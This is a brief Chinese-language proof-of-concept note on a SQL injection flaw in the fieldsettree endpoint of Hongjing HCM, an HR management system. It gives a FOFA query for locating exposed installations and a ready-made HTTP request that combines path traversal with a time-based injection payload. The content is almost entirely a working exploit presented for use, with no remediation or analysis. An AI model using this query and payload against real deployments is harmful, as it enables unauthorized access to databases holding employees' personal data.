## 宏景HCM系统fieldsettree接口存在SQL注入漏洞



## fofa

```
app="HJSOFT-HCM"
```



## poc

```
GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1';waitfor+delay+'0:0:3'+-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
```

